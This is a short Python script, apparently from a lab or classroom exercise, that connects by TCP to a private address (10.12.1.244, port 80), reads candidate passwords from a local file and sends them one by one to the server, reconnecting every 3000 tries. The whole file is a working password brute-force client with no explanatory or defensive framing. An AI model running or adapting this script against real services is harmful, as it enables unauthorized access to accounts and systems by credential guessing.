
from socket import *
import time
from os.path import abspath, exists


# def send_by_byte(output: str, s: socket):
#     for i in range(0, len(output)):
#         s.send(output[i].encode())
#     #s.send('\r\n'.encode())
#
#     return

def main():
    server_name = '10.12.1.244'
    server_port = 80
    client_socket = create_socket(server_name, server_port)

    f_path = abspath("passwords")

    sentinel = 0
    if exists(f_path):
        with open("passwords") as f:
            for l in f:
                sentinel += 1
                attempt = l.strip()

                print(attempt)

                client_socket.send(attempt.encode())
                time.sleep(.01)

                if sentinel >= 3000:
                    client_socket.close()
                    client_socket = create_socket(server_name, server_port)
                    sentinel = 0

    else:
        print("failed to find path")

    print("Stopping service ...\n")
    time.sleep(10)
    client_socket.close()
    print("Service stopped!")


def create_socket(serverName, serverPort):
    # Create a TCP client socket
    # (AF_INET is used for IPv4 protocols)
    # (SOCK_STREAM is used for TCP)
    client_socket = socket(AF_INET, SOCK_STREAM)
    client_socket.connect((serverName, serverPort))

    return client_socket


main()
